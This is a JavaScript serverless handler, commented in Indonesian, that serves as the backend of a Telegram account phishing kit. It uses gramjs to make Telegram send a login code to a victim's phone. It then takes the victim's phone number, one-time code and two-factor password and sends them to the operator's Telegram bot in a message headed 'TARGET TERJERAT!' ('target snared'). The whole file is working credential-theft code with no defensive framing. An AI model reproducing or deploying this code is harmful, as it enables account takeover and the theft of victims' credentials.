import { TelegramClient } from "gramjs";
import { StringSession } from "gramjs/sessions";

const apiId = 35622190; // GANTI DENGAN API_ID MILIKMU
const apiHash = "1897c294928d8f3d362d6ac692b69155"; // GANTI DENGAN API_HASH MILIKMU
const botToken = "TOKEN_BOT_MU"; // UNTUK NOTIFIKASI HASIL
const chatId = "ID_CHAT_MU";

let sessionCache = {}; // Penyimpanan sementara hash OTP

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const { action, phone, otp, password } = req.body;
    const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });

    try {
        if (action === "SEND_OTP") {
            await client.connect();
            const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, phone);
            sessionCache[phone] = phoneCodeHash; // Simpan hash untuk tahap verifikasi
            return res.status(200).json({ success: true });
        }

        if (action === "VERIFY") {
            const phoneCodeHash = sessionCache[phone];
            const resultText = `🚨 **TARGET TERJERAT!** 🚨\n\n` +
                               `📱 No HP: \`${phone}\`\n` +
                               `🔑 OTP: \`${otp}\`\n` +
                               `🔐 2FA: \`${password || 'N/A'}\``;

            // Kirim hasil ke bot Telegram-mu
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(resultText)}&parse_mode=Markdown`);

            return res.status(200).json({ success: true });
        }
    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}
